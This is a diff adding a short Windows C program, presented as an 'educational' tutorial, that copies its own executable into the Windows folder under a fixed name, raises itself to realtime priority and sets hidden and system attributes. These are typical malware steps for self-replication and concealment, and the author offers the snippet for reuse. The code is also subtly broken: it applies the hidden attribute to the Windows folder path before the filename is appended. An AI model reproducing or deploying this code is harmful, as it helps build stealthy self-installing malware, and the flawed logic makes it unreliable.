@@ -1,0 +1,65 @@
+/* 
+How to clone your application into the Windows folder!
+
+Author: K1u
+Site: k0h.org & k1u.org
+Disclaimer: I am not responsible for how you use this.
+This is purely for educational purposes.
+BTW: If you wish to use this in your application give me a shout.
+
+*/
+ 
+#include "stdafx.h"
+#include <windows.h>
+#include <shlobj.h>
+
+#include <shlwapi.h>
+#pragma comment(lib, "shlwapi.lib")
+ 
+int main(void)
+
+{
+    /* Windows Folder Path. */
+    TCHAR winFP[MAX_PATH];
+
+ 
+    /* Process filename. */
+    TCHAR szPath[MAX_PATH];
+ 
+    /* Raise priority to realtime. */
+
+    SetPriorityClass(GetCurrentProcess(),
+                     REALTIME_PRIORITY_CLASS);
+
+ 
+    /* Grab filename of process. */
+    GetModuleFileName(NULL,
+
+                      szPath,
+                      MAX_PATH);
+ 
+    /* Grab path of Windows folder. */
+
+    SHGetFolderPath(NULL, 
+                    CSIDL_WINDOWS|CSIDL_FLAG_CREATE, 
+                    NULL, 
+
+                    0,
+                    winFP);
+ 
+    /* Set as hidden file. */
+
+    SetFileAttributes(winFP,
+                      FILE_ATTRIBUTE_HIDDEN|FILE_ATTRIBUTE_SYSTEM);
+ 
+    /* Add the filename. */                
+
+    PathAppend(winFP,
+               TEXT("\\nameme.exe"));
+
+ 
+    /* Copy it already!!! */
+    CopyFile(szPath, winFP, 0);
+
+    return 0;
+}
